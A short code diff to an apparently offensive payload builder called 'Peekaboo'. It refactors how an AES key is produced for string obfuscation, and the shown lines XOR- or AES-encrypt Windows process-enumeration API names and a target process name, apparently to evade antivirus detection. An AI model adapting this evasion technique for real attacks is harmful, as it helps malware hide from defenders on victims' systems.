@@ -38,6 +38,9 @@ class PeekabooEncryptor():
     def dll_key(self):
         return self.XOR_DLL
 
+    def aes_key(self):
+        return self.random_bytes()
+
     def xor(self, data, key):
         key = str(key)
         l = len(key)
@@ -151,7 +154,7 @@ def run_peekaboo(host, port, proc_name, mode):
     ciphertext_clh, clh_key = encryptor.xor_encrypt(f_clh, encryptor.func_key())
     ciphertext_p32f, p32f_key = encryptor.xor_encrypt(f_p32f, encryptor.func_key())
     ciphertext_p32n, p32n_key = encryptor.xor_encrypt(f_p32n, encryptor.func_key())
-    ciphertext_op, op_key = encryptor.aes_encrypt(f_op, encryptor.random_bytes())
+    ciphertext_op, op_key = encryptor.aes_encrypt(f_op, encryptor.aes_key())
     ciphertext_ct32s, ct32s_key = encryptor.xor_encrypt(f_ct32s, encryptor.func_key())
     ciphertext_proc, proc_key = encryptor.xor_encrypt(proc_name, encryptor.proc_key())
     ciphertext_k32, k32_key = encryptor.xor_encrypt(k32_name, encryptor.dll_key())
